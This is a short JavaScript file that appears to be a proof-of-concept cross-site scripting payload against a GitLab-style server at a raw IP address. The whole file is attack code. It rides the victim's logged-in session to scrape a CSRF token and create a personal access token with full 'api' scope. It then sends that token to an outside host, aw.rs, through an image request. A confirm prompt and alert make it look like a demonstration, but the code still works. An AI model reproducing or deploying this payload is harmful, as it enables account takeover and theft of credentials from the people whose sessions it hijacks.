function next(token) {
fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
  "headers": {
    "content-type": "application/x-www-form-urlencoded"
  },
  "body": "authenticity_token="+encodeURIComponent(token)+"&personal_access_token%5Bname%5D=asd&personal_access_token%5Bexpires_at%5D=&personal_access_token%5Bscopes%5D%5B%5D=api",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}).then(response => response.text())
  .then(text => {
    const parser = new DOMParser();
    const htmlDocument = parser.parseFromString(text, "text/html");
    const token = htmlDocument.documentElement.querySelector("input[name='created-personal-access-token']").value
    alert("Created token is: " + token);
    const image = new Image();
    image.src = `//aw.rs/g/leak.gif?token=${token}`;
  });
}

function runner(){
  fetch(
    "https://65.52.77.188/-/profile/personal_access_tokens",
    {
      credentials: "include",
      method: "GET",
      mode: "cors"
    }
  ).then(response => response.text())
  .then(text => {
    const parser = new DOMParser();
    const htmlDocument = parser.parseFromString(text, "text/html");
var token = htmlDocument.documentElement.querySelector('meta[name="csrf-token"]').content;
    next(token)})
}

if(!donescript) {
  var donescript=true;
  window.stop();
if (confirm("Create an access token?")) {
  runner();
}}
